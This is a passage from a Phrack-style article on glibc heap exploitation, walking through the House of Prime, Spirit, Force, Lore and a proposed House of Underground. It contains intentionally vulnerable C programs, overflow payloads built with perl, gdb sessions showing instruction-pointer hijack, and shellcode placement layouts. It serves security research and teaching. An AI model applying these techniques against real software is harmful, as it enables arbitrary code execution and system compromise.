of Prime. We must control a value into memory and place address of
&quot;victim&quot; just 4 bytes before, so this value would become its new size.

Our vulnerable application get as parameters: &quot;name&quot;, &quot;surname&quot; and &quot;age&quot;.
This last value is an integer that will be stored in the stack. If we
make: age = 1024-&gt;(1032), we only must look for it into the stack to know
the final address of &quot;victim&quot;.

[-----]

(gdb) run Black Ngel 1032 &lt; file
ptr found at [ 0x80b2a20 ]
ptr1ovf found at [ 0x80b2e28 ]
ptr2ovf found at [ 0x80b3230 ]
Escriba una descripcion:
END free(1)

END free(2)

Breakpoint 2, 0x080482d9 in fvuln ()
(gdb) x/4x $ebp-32
0xbffff838:     0x00000000      0x00000000      0xbf000000      0x00000408

[-----]

Here we have our value, we should point to &quot;0xbffff840&quot;.

        for (i = 0; i &lt; (600 / 4); i++)
                fwrite(&quot;\x40\xf8\xff\xbf&quot;, 4, 1, stdout);
	
You should have: ptr3 = malloc(1024) = 0xbffff848, remember that it
returns a pointer to the memory (data area) and not to chunk's header.

We are really close to EBP and EIP. What happens if our &quot;name&quot; is
composed by a few letters &quot;A&quot;?

[-----]

(gdb) run Black `perl -e 'print &quot;A&quot;x64'` 1032 &lt; file
.....
ptr found at [ 0x80b2a20 ]
ptr1ovf found at [ 0x80b2e28 ]
ptr2ovf found at [ 0x80b3230 ]
Escriba una descripcion:
END free(1)

END free(2)

Breakpoint 2, 0x080482d9 in fvuln ()
(gdb) c
Continuing.

END malloc()

Breakpoint 3, 0x08048307 in fvuln ()
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb)

[-----]
	
Bingo! I think that you can put your own Shellcode, right?

Actually, addresses require manual adjustments, but that is trivial when
you know write &quot;gdb&quot; in your shell.

At first, this technique is only applicable to version 2.3.6 of GLIBC.
Later was added in the &quot;free()&quot; function an integrity check like this:

[-----]

  /* We know that each chunk is at least MINSIZE bytes in size. */
  if (__builtin_expect (size &lt; MINSIZE, 0))
    {
      errstr = &quot;free(): invalid size&quot;;
      goto errout;
    }

  check_inuse_chunk(av, p);

[-----]

	
Which does not allow us to establish a smaller size than &quot;16&quot;.

In honor to the first house developed and built by Phantasmal we have
shown that it is possible to arrive alive at The House of Prime.



                       &lt;&lt; La tecnica no solo es una
                          modificacion, es poder sobre
                          las cosas. &gt;&gt;

                                     [ Xavier Zubiri ]



               -----------------------
---[ 4.2.1 ---[   unsorted_chunks()   ]---
               -----------------------
	
Until the call to &quot;malloc()&quot;, the technique is exactly the same as
described in 4.2. The difference comes when the amount of bytes that you
want to alloc with that call is over &quot;av-&gt;max_fast&quot;, which appears to be
the size of the second chunk passed to free().

Then, as Phantasmal advanced us, another piece of code can be triggered so
that we will can overwrite an arbitrary address of memory.

But again he was wrong when he said:

   &quot;Firstly, the unsorted_chunks() macro returns av-&gt;bins[0].&quot;

And this is not true, because &quot;unsorted_chunks ()&quot; returned address of
&quot;av-&gt;bins[0]&quot; and not its value, which means that we must devise another
method.

Being these lines the most relevant:

     .....
        victim = unsorted_chunks(av)-&gt;bk
        bck = victim-&gt;bk;
        .....
        .....
        unsorted_chunks(av)-&gt;bk = bck;
        bck-&gt;fd = unsorted_chunks(av);
     .....

I propose the following method:

 1) Put at &amp;av-&gt;bins[0]+12 the address of (&amp;av-&gt;bins[0]+16-12). Then:

    victim = &amp;av-&gt;bins[0]+4;

 2) Put at &amp;av-&gt;bins[0]+16 address of EIP - 8. Then:

    bck = (&amp;av-&gt;bins[0]+4)-&gt;bk = av-&gt;bins[0]+16 = &amp;EIP-8;

 3) Put at av-&gt;bins[0] a &quot;JMP 0xYY&quot; sentence to jump at least as far
    as &amp;av-&gt;bins[0]+20. In the penultimate sentence it will destroy
    &amp;av-&gt;bins[0]+12, but it is not important now, to the end we will
    have:

    bck-&gt;fd = EIP = &amp;av-&gt;bins[0];

 4) Put (NOPS + SHELLCODE) from &amp;av-&gt;bins[0] + 20.

 	
When a &quot;ret&quot; instruction is executed, it will go to our &quot;JMP&quot; and this
fall directly on the NOPS, moving east until the shellcode.

We should have something like this:


    &amp;av-&gt;bins[0]     &amp;av-&gt;bins[0]+12     &amp;av-&gt;bins[0]+16
    |                |                   |
 ...[ JMP 0x16 ].....[&amp;av-&gt;bins[0]+16-12][ EIP - 8][ NOPS + SHELLCODE ]...
           |______________________|______|_________|
          (2)                     |______|
                                 (1)

  (1) This happens here: bck = (&amp;av-&gt;bins[0]+4)-&gt;bk.
  (2) This happens after the execution of a &quot;ret&quot;

	
The great advantage of this method is that we can achieve a direct
arbitrary code execution instead of returning a controlled chunk from
&quot;malloc()&quot;.

Perhaps through this clever way you can directly reach The House of Prime.



               &lt;&lt; Felicidad no es hacer lo que
                  uno quiere, sino querer lo que
                  uno hace. &gt;&gt;

                                [ J. P. Sartre ]



             -------------------------
---[ 4.3 ---[   THE HOUSE OF SPIRIT   ]---
             -------------------------

The House of Spirit is, undoubtedly, one of the most simple applied
technique when circumstances are propitious. The goal is to overwrite
a pointer that was previously allocated with a call to &quot;malloc()&quot; so
that when this is passed to free(), an arbitrary address will be stored
in a &quot;fastbin[]&quot;.

This can bring that in a future call to malloc(), this value will be taken
as the new memory for the requested chunk. And what happens if I do that
this memory chunk to fall into any specific area of stack?

Well, if we can control what we write in, we can change everything value
that is ahead. As always, this is where EIP enters to the game.

Let's go to see a vulnerable program:

[-----]

#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;

void fvuln(char *str1, int age)
{
   static char *ptr1, name[32];
   int local_age;
   char *ptr2;

   local_age = age;

   ptr1 = (char *) malloc(256);
   printf(&quot;\nPTR1 = [ %p ]&quot;, ptr1);
   strcpy(name, str1);
   printf(&quot;\nPTR1 = [ %p ]\n&quot;, ptr1);

   free(ptr1);

   ptr2 = (char *) malloc(40);

   snprintf(ptr2, 40-1, &quot;%s is %d years old&quot;, name, local_age);
   printf(&quot;\n%s\n&quot;, ptr2);
}

int main(int argc, char *argv[])
{
   if (argc == 3)
      fvuln(argv[1], atoi(argv[2]));

   return 0;
}

[-----]

It is easy to see how the &quot;strcpy()&quot; function allow to overwrite the
&quot;ptr1&quot; pointer:

   blackngel@mac:~$ ./hos `perl -e 'print &quot;A&quot;x32 . &quot;BBBB&quot;'` 20
   PTR1 = [ 0x80c2688 ]
   PTR1 = [ 0x42424242 ]
   Segmentation fault
	
With this in mind, we can change the address of the chunk, but not all
addresses are valid. Remember that in order to execute the &quot;fastbin&quot; code
described in The House of Prime, we need a minor value than &quot;av-&gt;max_fast&quot;
and, more specifically, as Phantasmal said, it has to be equal to the size
requested in the future call to &quot;malloc()&quot; + 8.

So as one of the arguments in our application is the &quot;age&quot; parameter, we
can put any value in the stack, which in this case will be &quot;0x48&quot;, and
seek its address.

(gdb) x/4x $ebp-4
0xbffff314:	0x00000030	0xbffff338	0x080482ed	0xbffff702

In our case we see that the value is just behind EBP, and PTR1 would must
point to EBP. Remember that we are modifying the pointer to memory, not
the chunk's address.

The most important requirement to success of this technique is pass the
integrity check of the next chunk:

      if (chunk_at_offset (p, size)-&gt;size &lt;= 2 * SIZE_SZ
          || __builtin_expect (chunksize (chunk_at_offset (p, size))
                                          &gt;= av-&gt;system_mem, 0))

... at $EBP - 4 + 48 we must have a value that meets the above conditions.
Otherwise you should look for another addresses of memory that can allow
you to control both values.

(gdb) x/4x $ebp-4+48
0xbffff344:	0x0000012c	0xbffff568	0x080484eb	0x00000003

I will shown what it happens:


                   val1         target                val2
                    o             |                     o
      -64           |  mem  -4    0   +4  +8  +12 +16   |
       |            |   |    |    |    |   |   |   |    |
  .....][P_SIZE][size+8][...][EBP][EIP][..][..][..][next_size][ ......
                    |   |                           |
                    o---|---------------------------o
                        |      (size + 8) bytes
                       PTR1
                        |---&gt; Future PTR2
                                     ----

   (target) Value to overwrite.
   (mem)  Data of fakechunk.
   (val1) Size of fakechunk.
   (val2) Size of next chunk.


If this happens, control will be in our hands:

[-----]

blackngel@linux:~$ gdb -q ./hos
(gdb) disass fvuln
Dump of assembler code for function fvuln:
0x080481f0 &lt;fvuln+0&gt;:	push   %ebp
0x080481f1 &lt;fvuln+1&gt;:	mov    %esp,%ebp
0x080481f3 &lt;fvuln+3&gt;:	sub    $0x28,%esp
0x080481f6 &lt;fvuln+6&gt;:	mov    0xc(%ebp),%eax
0x080481f9 &lt;fvuln+9&gt;:	mov    %eax,-0x4(%ebp)
0x080481fc &lt;fvuln+12&gt;:	movl   $0x100,(%esp)
0x08048203 &lt;fvuln+19&gt;:	call   0x804f440 &lt;malloc&gt;
..........
..........
0x08048230 &lt;fvuln+64&gt;:	call   0x80507a0 &lt;strcpy&gt;
..........
..........
0x08048252 &lt;fvuln+98&gt;:	call   0x804da50 &lt;free&gt;
0x08048257 &lt;fvuln+103&gt;:	movl   $0x28,(%esp)
0x0804825e &lt;fvuln+110&gt;:	call   0x804f440 &lt;malloc&gt;
..........
..........
0x080482a3 &lt;fvuln+179&gt;:	leave  
0x080482a4 &lt;fvuln+180&gt;:	ret    
End of assembler dump.

(gdb) break *fvuln+19          /* Before malloc() */
Breakpoint 1 at 0x8048203

(gdb) run `perl -e 'print &quot;A&quot;x32 . &quot;\x18\xf3\xff\xbf&quot;'` 48
.........
..........
Breakpoint 1, 0x08048203 in fvuln ()
(gdb) x/4x $ebp-4   /* 0x30 = 48 */
0xbffff314:	0x00000030	0xbffff338	0x080482ed	0xbffff702

(gdb) x/4x $ebp-4+48   /* 8 &lt; 0x12c &lt; av-&gt;system_mem */
0xbffff344:	0x0000012c	0xbffff568	0x080484eb	0x00000003

(gdb) c
Continuing.

PTR1 = [ 0x80c2688 ]
PTR1 = [ 0xbffff318 ]

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()

[-----]

In this special case, the address of EBP would be the address of PTR2 zone
data, which means that the fourth write character will overwrite EIP, and
you will can point to your Shellcode.

This technique has the advantage, once again, to remain applicable in
the newer versions of glibc so as PTMALLOC3. Must be known that the
Phantasmal's theory still remain to the pass of the time.

Now you can feel the power of witches. We arrived, flying in broom at The
House of Spirit.



                        &lt;&lt; La television es el espejo donde
                           se refleja la derrota de todo
                           nuestro sistema cultural. &gt;&gt;

                                       [ Federico Fellini ]



             -------------------------
---[ 4.4 ---[   THE HOUSE OF FORCE    ]---
             -------------------------

The top chunk (Wilderness), as I mentioned earlier in this article may be
one of the most dreaded chunks. Sure, it is treated in a special way by
the free() and malloc() functions, but in this case will be the trigger
for a possible arbitrary code execution.

The main goal of this technique is to reach the next piece of code in
&quot;_int_malloc ()&quot;:

[-----]

    .....
    use_top:
      victim = av-&gt;top;
      size = chunksize(victim);

      if ((unsigned long)(size) &gt;= (unsigned long)(nb + MINSIZE)) {
        remainder_size = size - nb;
        remainder = chunk_at_offset(victim, nb);
        av-&gt;top = remainder;
        set_head(victim, nb | PREV_INUSE |
                 (av != &amp;main_arena ? NON_MAIN_ARENA : 0));
        set_head(remainder, remainder_size | PREV_INUSE);
        check_malloced_chunk(av, victim, nb);
        return chunk2mem(victim);
      }
    .....

[-----]
	
This technique requires three conditions:

    1 - One overflow in a chunk that allows to overwrite the Wilderness.

    2 - A call to &quot;malloc()&quot; with size field defined by designer.

    3 - Another call to &quot;malloc()&quot; where data can be handled by designer.

The ultimate goal is to get a chunk placed in an arbitrary memory. This
position will be obtained by the last call to &quot;malloc()&quot;, but first we
must analyse more things.

Consider first a possible vulnerable program:

[-----]

#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;

void fvuln(unsigned long len, char *str)
{
   char *ptr1, *ptr2, *ptr3;

   ptr1 = malloc(256);
   printf(&quot;\nPTR1 = [ %p ]\n&quot;, ptr1);
   strcpy(ptr1, str);

   printf(&quot;\Allocated MEM: %u bytes&quot;, len);
   ptr2 = malloc(len);
   ptr3 = malloc(256);

   strncpy(ptr3, &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;, 256);
}

int main(int argc, char *argv[])
{
   char *pEnd;
   if (argc == 3)
      fvuln(strtoull(argv[1], &amp;pEnd, 10), argv[2]);

   return 0;
}

[-----]

Phantasmal said that the first thing to do was to overwrite the
Wilderness chunk so that its &quot;size&quot; field was as high as possible,
as well as &quot;0xffffffff&quot;. Since our first chunk is 256 bytes long,
and it is vulnerable to overflow, 264 characters &quot;\xff&quot; achieve the
objective.

This ensures that any request of memory enough large, is treated with
the code &quot;_int_malloc()&quot;, instead of expand the heap.

The second goal, is to alter &quot;av-&gt;top&quot; so it points to a memory area under
designer control. We (it's view in next section) will work with the stack,
particularly with the EIP target. In fact, the address that should be
placed in &quot;av-&gt;top&quot; is EIP - 8, because we are dealing with the chunk
address, and the return data area is 8 bytes later, there where we will
write our data.

But... How hack &quot;av-&gt;top&quot;?

   victim = av-&gt;top;
   remainder = chunk_at_offset(victim, nb);
   av-&gt;top = remainder;

&quot;victim&quot; get address of the current Wilderness chunk, that in a normal
case we could see so as: 

   PTR1 = [ 0x80c2688 ]

   0x80bf550 &lt;main_arena+48&gt;:   0x080c2788

As we can see, &quot;remainder&quot; is exactly the sum of this address plus the
number of bytes requested by &quot;malloc ()&quot;. This amount must be controlled
by the designer as mentioned above.

Then, if EIP is &quot;0xbffff22c&quot;, the address that we want placed at remainder
(which will goes direct to &quot;av-&gt;top&quot;) is actually this: &quot;0xbfffff24&quot;. And
now we know where this &quot;av-&gt;top&quot;. Our number of bytes to request are:

    0xbffff224 - 0x080c2788 = 3086207644

I exploited the program with &quot;3086207636&quot;, which again, is due to the
difference between the position of the chunk and data area of Wilderness.

Since that time, &quot;av-&gt;top&quot; contain our altered value, and any request that
triggers this piece of code, get this address as its data zone. Everything
that is written will destroy the stack.

GLIBC 2.7 do the next:

      ....
      void *p = chunk2mem(victim);
      if (__builtin_expect (perturb_byte, 0))
	alloc_perturb (p, bytes);
      return p;

Let's to go:

[-----]

blackngel@linux:~$ gdb -q ./hof
(gdb) disass fvuln
Dump of assembler code for function fvuln:
0x080481f0 &lt;fvuln+0&gt;:   push   %ebp
0x080481f1 &lt;fvuln+1&gt;:   mov    %esp,%ebp
0x080481f3 &lt;fvuln+3&gt;:   sub    $0x28,%esp
0x080481f6 &lt;fvuln+6&gt;:   movl   $0x100,(%esp)
0x080481fd &lt;fvuln+13&gt;:  call   0x804d3b0 &lt;malloc&gt;
..........
..........
0x08048225 &lt;fvuln+53&gt;:  call   0x804e710 &lt;strcpy&gt;
..........
..........
0x08048243 &lt;fvuln+83&gt;:  call   0x804d3b0 &lt;malloc&gt;
0x08048248 &lt;fvuln+88&gt;:  mov    %eax,-0x8(%ebp)
0x0804824b &lt;fvuln+91&gt;:  movl   $0x100,(%esp)
0x08048252 &lt;fvuln+98&gt;:  call   0x804d3b0 &lt;malloc&gt;
..........
..........
0x08048270 &lt;fvuln+128&gt;: call   0x804e7f0 &lt;strncpy&gt;
0x08048275 &lt;fvuln+133&gt;: leave  
0x08048276 &lt;fvuln+134&gt;: ret    
End of assembler dump.

(gdb) break *fvuln+83      /* Before malloc(len) */
Breakpoint 1 at 0x8048243

(gdb) break *fvuln+88      /* After malloc(len) */
Breakpoint 2 at 0x8048248

(gdb) run 3086207636 `perl -e 'print &quot;\xff&quot;x264'`
.....
PTR1 = [ 0x80c2688 ]

Breakpoint 1, 0x08048243 in fvuln ()
(gdb) x/16x &amp;main_arena
..........
..........
0x80bf550 &lt;main_arena+48&gt;:  0x080c2788  0x00000000  0x080bf550  0x080bf550
                                 | 
(gdb) c                       av-&gt;top
Continuing.

Breakpoint 2, 0x08048248 in fvuln ()
(gdb) x/16x &amp;main_arena
..........
..........
0x80bf550 &lt;main_arena+48&gt;:  0xbffff220  0x00000000  0x080bf550  0x080bf550
                                 |
                          point to stack
(gdb) x/4x $ebp-8
0xbffff220:   0x00000000   0x480c3561   0xbffff258   0x080482cd
                                | 
(gdb) c                     important
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()    /* Our application smash the stack itself */
(gdb) 

[-----]

Yeah! So it was possible!!!

I pointed out one value as &quot;important&quot; in the stack, and it is one of
the last condition for a successful implementation of this technique.
It requires that the &quot;size&quot; field of the new Wilderness chunk, been at
least greater than the request made by the last call to &quot;malloc()&quot;.

NOTE: As you have seen in the introduction of this article, g463 wrote a
      paper about how to take advantage of the set_head() macro in order
      to overwrite an arbitrary memory address. This would be strongly
      recommendable that you read this work. He also presented a briew
      research about The House of Force...

      Due to a serious error of mine, I did not read this article until
      a Phrack member warned me of its existence after I had edited my
      article. I can't avoid feeling amazed at the level of skills these
      people are reaching. The work of g463 is really smart.

In conclusion to this technique, I asked what would happen if, instead of
what we have seen, the vulnerable code would looks like:

   .....
   char buffer[64];

   ptr2 = malloc(len);
   ptr3 = calloc(256);

   strncpy(buffer, argv[1], 63);
   .....

At first, it is quite similar, only the last chunk of memory allocated is
done through the function &quot;calloc()&quot; and in this case do not control their
content, but we control a buffer declared at the beginning of the
vulnerable function.

Faced with this obstacle, I had an idea in mind. If it remains possible
return an arbitrary piece of memory and since calloc() will fill it with
&quot;0's&quot;, perhaps it could be placed so that the last NULL byte &quot;0&quot; may
overwrite the last byte of a saved EBP, so this is passed finally to ESP,
and may control the return address from within our buffer[].

But soon I warned that the alignment of malloc() algorithm when this is
called, thwarts this possibility. We could overwrite EBP completely with
&quot;0's&quot;, which is useless for our purposes. And besides, always there to
take care not to crush our buffer[] with zeros if the reserve of memory
occurs after the content has been established by the user.

And it is all... As always, this technique also remains being applicable
with the latest versions of glibc (2.8.90).

We have arrived, pushed by the power of force, to The House of Force.



                          &lt;&lt; La gente comienza a plantearse
                             si todo lo que se puede hacer
                             se debe hacer. &gt;&gt;

                                          [ D. Ruiz Larrea ]



               ---------------
---[ 4.4.1 ---[   MISTAKES    ]---
               ---------------

In fact, what we have done in the previous section, the fact of using the
stack was the only viable solution that I found, after realize some errors
that Phantasmal had not expected.

The point is that the description of his technique, he raised the
possibility of overwrite targets as .dtors or Global Offset Table.
But I soon realized that this did not seem possible.

Given that &quot;av-&gt;top&quot; was: [0x080c2788]. In a short analysis like this...

     blackngel@linux:~$ objdump -s -j .dtors ./hof
     .....
     Contents of section .dtors:
     80be47c ffffffff 20480908 00000000
     .....
     Contents of section .got:
     80be4b8 00000000 00000000 

... we can see that both addresses are behind the address of &quot;av-&gt;top&quot;,
and an amount not lead us to these addresses. Function pointers, the BSS
region, and also other things are behind...

If you want to play with negative numbers or integer overflows, I allow
that you to make all neccesary tests.

It is by this that the Malloc Maleficarum did not mention that the
designer controlled value to allocate memory, should be an &quot;unsigned&quot; or,
otherwise, any value greater than 2147483647 will change its sign directly
to become a negative value, which ends at most cases with a segmentation
fault.

He doesn't think this because he think that he could overwrite memory
positions that were at highest addresses that the Wilderness chunk, bu
not as far as &quot;0xbffffxxx&quot;.

Imposible is nothing in this world, and I know that you can feel The House
of Force.



               &lt;&lt; La utopia esta en el horizonte. Me
                  acerco dos pasos, ella se aleja dos
                  pasos. Camino diez pasos y el horizonte
                  se corre diez pasos mas alla. Por
                  mucho que yo camine, nunca la alcanzare.
                  Para que sirve la utopia? Para eso
                  sirve, para caminar. &gt;&gt;

                                            [ E. Galeano ]



             -----------------------
---[ 4.5 ---[   THE HOUSE OF LORE   ]---
             -----------------------
	
This technique will be detailed here in a theoretical way to express what
Phantasmal supposedly wanted to say in his Malloc Maleficarum paper.

The House of Lore requires triggering numerous calls to &quot;malloc()&quot; what
seems not to be a designer controlled value and turns into something
unreal.

But I again repeat the same thing I said at the end of the technique The
House of Mind (CVS vulnerability). And the same showed case is perfect for
the conditions that should meet in The House of Lore. We need multiple
calls to malloc( ) controlling their sizes.

To give a simple explanation, we will approach to the topic through
schemes.

When a chunk is stored in your appropriated &quot;bin&quot;, it is inserted as the
first:

       1) Calculating the index for the chunk's size:

             victim_index = smallbin_index(size);

       2) Get the proper bin:

             bck = bin_at(av, victim_index);

       3) Get the first chunk:

             fwd = bck-&gt;fd;

       4) Pointer &quot;bk&quot; of chunk points to the bin:

             victim-&gt;bk = bck;

       5) Pointer &quot;fd&quot; of chunk points to the previous
          first chunk at bin:

             victim-&gt;fd = fwd;

       6) Pointer &quot;bk&quot; of the next chunk points to our
          inserted chunk:

             fwd-&gt;bk = victim;

       7) Pointer &quot;fd&quot; of the &quot;bin&quot; points to our chunk:

             bck-&gt;fd = victim;


                   bin-&gt;bk  ___  bin-&gt;fwd
                  o--------[bin]----------o
                  !         ^ ^           !
               [last]-------| |-------[victim]
                 ^|   l-&gt;fwd    v-&gt;bk    ^|
                 |!                      |!
               [....]                  [....]
                   \\                  //
                    [....]        [....]
                     ^ |____________^ |
                     |________________|    


	
Into &quot;unlink code&quot;, if &quot;victim&quot; is taken from &quot;bin-&gt;bk, it may be
necessary to repeat numerous calls to malloc() until the &quot;victim&quot; reach
the &quot;last&quot; position.

Let's see the code to discover a few things:


      .....
      if ( (victim = last(bin)) != bin) {
        if (victim == 0) /* initialization check */
          malloc_consolidate(av);
        else {
          bck = victim-&gt;bk;
          set_inuse_bit_at_offset(victim, nb);
          bin-&gt;bk = bck;
          bck-&gt;fd = bin;
          ...
          return chunk2mem(victim);
      .....


In this technique, Phantasmal said that the ultimate goal was to overwrite
&quot;bin-&gt;bk,&quot; but the first element that we can control is &quot;victim-&gt;bk&quot;.  As
far as I can understand, we must ensure that the overflowed chunk passed
to &quot;free ()&quot; is in the previous position to &quot;last&quot;, so that &quot;victim-&gt;bk&quot;
point to its address, that we must control and should point to the stack.

This address is passed to &quot;bck&quot; and then will change &quot;bin-&gt;bk&quot;. Due to
this, we now control the &quot;last&quot; chunk with a designer controlled address.

That is why we need a new call to &quot;malloc()&quot; with same size as the
previous call, so that this value is the new &quot;victim&quot; and is returned in:

     return chunk2mem (victim);

[-----]


     *ptr1 -&gt; modified;

     First call to &quot;malloc()&quot;:
     -------------------------

         ___[chunk]_____[chunk]_____[chunk]____ 
        |                                      |
        !    bk                 bk             |
      [bin]-----&gt;[last=victim]-----&gt;[ ptr1 ]---/
        ^____________| ^_______________|
             fwd      ^       fwd
                      |
        return chunk2men(victim);



     Second call to &quot;malloc()&quot;:
     --------------------------

         ___[chunk]_____[chunk]_____[chunk]____ 
        |                                      |
        !    bk              bk                |
      [bin]-----&gt;[ ptr1 ]---------&gt;[ chunk ]---/
        ^___________| ^________________|
             fwd     ^       fwd
                     |
        return chunk2men(ptr1);


[-----]

One must be careful with that also overwrites &quot;bck-&gt;fd&quot; in turn, in the
stack it is not a big problem.

It is for this reason that if your interest is really enough, my tip is
that you don't pay much attention to The House of Prime, as indicated
Phantasmal in his paper, instead, consider again the House of Spirit.

In theory, using a similar technique, a false chunk should can been sited
in its corresponding &quot;bin&quot; and trigger a further call to &quot;malloc()&quot; that
could returns the same memory space.

Remember that the size of allocated chunk must be greater than
&quot;av-&gt;max_fast&quot; (72), and less than 512 to execute &quot;small bin&quot; code instead
of fastbin code:

   #define NSMALLBINS        64
   #define SMALLBIN_WIDTH    MALLOC_ALIGNMENT
   #define MIN_LARGE_SIZE    (NSMALLBINS * SMALLBIN_WIDTH)

   [64] * [8] = [512]

For &quot;largebin&quot; method will have to use larger chunks than this estimated
size.

Like all houses, it's only a way of playing, and The House of Lore,
although not very suitable for a credible case, no one can say that
is a complete exception...



                   &lt;&lt; La humanidad necesita con urgencia
                      una nueva sabiduria que proporcione
                      el conocimiento de como usar el
                      conocimiento para la supervivencia
                      del hombre y para la mejora de la
                      calidad de vida. &gt;&gt;

                                         [ V. R. Potter ]



             ------------------------------
---[ 4.6 ---[   THE HOUSE OF UNDERGROUND   ]---
             ------------------------------

Well, this house really was not described in Phantasmal Phantasmagoria's
paper, but it is quite useful to describe a concept that I have in mind.

In this world are all possibilities. Chances that something goes well, or
chances of something going wrong. In the world of the vulnerabilities
exploitation, this remains true. The problem is to get the neccesary
skills to find these possibilities, usually the possibility of that
something goes well.

Speaking at this time to unite several of the prior techniques in a same
attack should not be so strange, and sometimes could be the most
appropriate solution. Recall that g463 is not satisfied with the technique
The House of Force to work on the vulnerability of the file (1) utility,
but he was looking for new possibilities so that things come out well.

For example ... what about using in a same instant the The House of Mind
and The House of Spirit methods?

Consider that both have their own limitations. On the one hand, The House
Mind need as has been said a piece of memory in an above address that
&quot;0x08100000&quot;, while The House of Spirit, states that once the pointer to
be free()ed has been overwritten, a new call to malloc() will be done.

In The House of Mind, the main goal is to control the &quot;arena&quot; structure
and this change starts with the modification of the third bit less
significant of the size field of the overwritten chunk (P). But the fact
we can modify this metadata, does not mean that we have control of the
address of this chunk.

In contrast, in The House of Spirit, we alter the address of P, through
the manipulation of the pointer to the data area (*mem). But what happens
if in your vulnerable application does not exist a new call to malloc()
that will return an arbitrary piece of memory on the stack?

You may still investigate new avenues, but I would not be assured that
running.

If we can change the pointer to be freed, like in The House of Spirit,
this will be passed to free() in:

   public_fREe(Void_t* mem)

We can make it point to some place like the stack or the environment. It
should always be a memory location with data controlled by the user. Then
the effective address of the chunk would taken at:

   p = mem2chunk(mem);
	
At this point we leave The House of The Spirit to focus on The House of
Mind. Then again we must control the arena &quot;ar_ptr&quot; and, to achieve this,
(&amp;p + 4) should contain a size with the NON_MAIN_ARENA bit enabled.

But that is not the most important thing here, the final question is:
could you put the chunk in a place so that you can then control the area
returned by &quot;heap_for_ptr(ptr)-&gt;ar_ptr&quot;?

Remember that in the stack that would be something like &quot;0xbff00000&quot;. It
seems quite difficult reach an address like this even introducing a
padding into environment.

But again, all ways should be studied, you could find a new method, and
perhaps you call it The House of Underground...



                 &lt;&lt; Los apasionados de Internet han encontrado
                    en esta opcion una impensada oportunidad
                    de volver a ilusionarse con el futuro. No
                    solo algunos disfrutan como enanos; creen
                    que este instrumento agiganta y que, acabada
                    la fragmentacion entre unos y otros, se ha
                    ingresado en la era de la conexion global.
                    Internet no tiene centro, es una red de
                    dibujo democratico y popular. &gt;&gt;

                               [ V. Verdu: El enredo de la red ]




           ----------------------------------------
---[ 5 ---[   ASLR and Nonexec Heap (The Future)   ]---
           ----------------------------------------

We have not discussed in this article about how to circumvent protections
like memory address randomization (ASLR) and a non executable Heap . And
we will not do, but something we can say about it. You should be aware
that in all my basic exploits, I have hardcoded the majority of the
addresses.

This way of working is not very reliable in the days we live in...

In all techniques presented in this paper, especially int The House of
Spirit or The House of Force, where all comes down to a stack overflow, we
guess that it would be applicable the methods described in other papers
released in Phrack magazine or extern publications that explained how to
bypass ASLR protection and others about how to return into mprotect ( ) to
bypass a non exectuable heap and things like that.

Regarding to the first topic, we have a magic work, &quot;Bypassing PaX ASLR
protection&quot; [11] by Tyler Durden in Phrack 59.

On the other hand, circumvent a non executable heap whether if ASLR is
present and our skills to find the real address of a function like
mprotect( ) to allow us to change the permissions of the pages of memory.

Since I started my little research and work to write this article, my goal
has always been to leave this task as the homework for new hackers who
have the strength to continue in this way.

Finally, this is a new area for further research.



                 &lt;&lt; Todo tiene algo de belleza pero
                    no todos son capaces de verlo. &gt;&gt;

                                         [ Confucio ]



           -------------------------
---[ 6 ---[   THE HOUSE OF PHRACK   ]---
           -------------------------
	
This is just a way so you can continue researching. There is a world full
of possibilities, and most of them still aren't discovered. Do you want
be the next?

This is your house!


To finish, because Phrack admits &quot;spirit oriented&quot; articles, I will
venture to drop a simple comment.

Anyone interested in Linux development had read ever interesting articles
as &quot;The Cathedral and the Bazar&quot; and &quot;Homesteading the Noosphere&quot; of the
arch-known founder of the Open Source movement, Eric S. Raymond. For this
is not so, maybe they had read &quot;Jargon File&quot; or perhaps for others, the
&quot;Hacker How-To&quot;. It is the latter that we are interested, especially when
Raymond mentions the following:

   * Don't use a silly, grandiose user ID or screen name.

   &lt;&lt; The problem with screen names or handles deserves some
      amplification. Concealing your identity behind a handle
      is a juvenile and silly behavior characteristic of crackers,
      warez d00dz, and other lower life forms. Hackers don't do
      this; they're proud of what they do and want it associated
      with their real names. So if you have a handle, drop it.
      In the hacker culture it will only mark you as a loser. &gt;&gt;
	

As far as I understand, this means that all those who had written in
Phrack are childhood, crackers, lower life forms and are marked in the
hacker culture as losers.

Is there some connection between our name and our skills, philosophy
of life or our ethics in hacking? 

Me, in my sole opinion, if this is true, I am proud that Phrack admit into
their lines to lower life forms. Lower life forms that have helped to
raise the security level of the network of networks in ways unimaginable.

To all of them, thanks!!!


blackngel



                         &quot;Adormecida, ella yace
                          con los ojos abiertos
                como la ascensin del Angel hacia arriba
                    Sus bellos ojos de disuelto azul
                que responden ahora: &quot;lo hare, lo hago!
                la pregunta realizada hace tanto tiempo.

                         Aunque ella debe gritar
                              no lo parece
                  lo que pronuncia es mas que un grito
                     Yo se que el Angel debe llegar
               para besarme suavemente, como mi estimulo
                la aguja profunda penetra en sus ojos.&quot;

              * Versos 4 y 5 de &quot;El beso del Angel Negro&quot;



           ----------------
---[ 7 ---[   REFERENCES   ]---
           ----------------

[1] Vudo - An object superstitiously believed to embody magical powers
    http://www.phrack.org/issues.html?issue=57&amp;id=8#article

[2] Once upon a free()
    http://www.phrack.org/issues.html?issue=57&amp;id=9#article

[3] Advanced Doug Lea's malloc exploits
    http://www.phrack.org/issues.html?issue=61&amp;id=6#article

[4] Malloc Maleficarum
    http://seclists.org/bugtraq/2005/Oct/0118.html    

[5] Exploiting the Wilderness
    http://seclists.org/vuln-dev/2004/Feb/0025.html

[6] The House of Mind
    http://www.awarenetwork.org/etc/alpha/?x=4

[7] The use of set_head to defeat the wilderness
    http://www.phrack.org/issues.html?issue=64&amp;id=9#article

[8] GLIBC 2.3.6
    http://ftp.gnu.org/gnu/glibc/glibc-2.3.6.tar.bz2

[9] PTMALLOC of Wolfram Gloger
    http://www.malloc.de/en/

[10] The art of Exploitation: Come back on an exploit
